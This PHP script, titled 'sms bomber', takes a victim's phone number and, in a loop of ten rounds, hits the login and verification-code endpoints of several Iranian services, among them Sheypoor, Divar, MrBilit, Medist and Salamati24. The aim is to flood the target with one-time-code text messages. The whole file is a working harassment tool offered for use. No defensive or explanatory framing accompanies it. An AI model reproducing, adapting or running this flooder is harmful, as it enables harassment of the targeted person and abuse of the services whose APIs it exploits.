<?php 
error_reporting(0);
if(isset($_POST['targetnumber']) && !empty($_POST['targetnumber'])){
  $number=$_POST['targetnumber'];
    for ($i=0; $i < 10; $i++) { 
     
        /* سایت شیپور */

    $url = "https://www.sheypoor.com/api/v10.0.0/auth/send";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    
    $data = <<<DATA
    {
      "username": "$number"
    }
    DATA;
    
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    
    $resp = curl_exec($curl);
    var_dump($resp);
    curl_close($curl);
    
    /* فیتامین */
    
    $url=file_get_contents("https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile=98$number");
    var_dump($url);
    
     /* مدیست */
    
    $url1=file_get_contents("https://medist.ir/api/user/requestMobile/0$number");
    var_dump($url1);
    
     /* سلامتی 24 */

    $url=file_get_contents("https://www.salamati24.com/api/activationcode?mobile=0$number");
    var_dump($url);

     /* مستر بلیط */

    $url=file_get_contents("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0$number&source=2&sendTokenIfNot=true");
    var_dump($url);

   /* دیوار */
  
$url = "https://api.divar.ir/v5/auth/authenticate";
  
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  
$data = <<<DATA
{
  "phone": "$number"
}
DATA;
  
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
  
$resp = curl_exec($curl);
var_dump($resp);
curl_close($curl);

  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=3device-width, initial-scale=1.0">
  <title>sms bomber</title>
</head>
<style>
  *{
    display: none;
  }
  p{
    display: block !important;
  }
</style>
<body>

</body>

</html>